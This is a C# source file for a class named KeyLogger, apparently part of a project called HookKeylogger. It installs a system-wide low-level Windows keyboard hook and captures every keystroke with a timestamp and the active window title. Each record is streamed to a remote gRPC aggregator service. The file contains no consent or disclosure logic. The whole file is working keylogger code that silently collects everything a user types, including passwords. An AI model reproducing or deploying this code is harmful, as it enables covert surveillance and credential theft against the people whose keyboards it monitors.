using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using HookKeylogger.Base;
using Grpc.Core;

namespace Hooks
{
    class KeyLogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private HookProc callback = null;
        private static IntPtr _hookID = IntPtr.Zero;
        private static String log = "";
        public static KerPressAggergator.KerPressAggergatorClient client;

        ///<summary>
        ///Initialize the keylogger.
        ///</summary>
        public KeyLogger(KerPressAggergator.KerPressAggergatorClient c)
        {
            client = c;

            callback = new HookProc(HookCallback);

            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, this.callback,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        ///<summary>
        ///Disconnect the hook.
        ///</summary>
        public void Deactivate()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        ///<summary>
        ///Get the active window name.
        ///</summary>
        private static string GetActiveWindowName()
        {
            const int numChars = 256;
            StringBuilder buffer = new StringBuilder(numChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, buffer, numChars) > 0)
            {
                return buffer.ToString();
            }
            return "";
        }

        ///<summary>
        /// HookCallback function
        /// 
        /// Called each time a Hook Event is fired. If the type of event is a KeyPress append the keypress and metadata to a keypress log.
        /// This function calls the next hook in the hook chain.
        ///</summary>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if ((client != null) && (client.Channel.State != ChannelState.FatalFailure)){
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    KeyPress ks = new KeyPress();
                    DateTimeOffset x = new DateTimeOffset(DateTime.Now);
                    ks.Key = Marshal.ReadInt32(lParam);
                    ks.Timestamp = x.ToUnixTimeMilliseconds();
                    ks.ActiveProgram = GetActiveWindowName();

                    // Un-Comment these lines to write the KeyStrokes in the JSON human readable format. C# proto
                    // implementation lacks support for the Text encoding, the json encoding is the most human readable format.
                    //StreamWriter o = new StreamWriter(log+".json");
                    //o.WriteLine(ks.ToString());
                    //o.Close();
                    try {
                        client.PutKeyPressAsync(ks);
                    }
                    catch (RpcException e)
                    {
                        Console.WriteLine("RPC Failed: " + e);
                    }
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    }
}
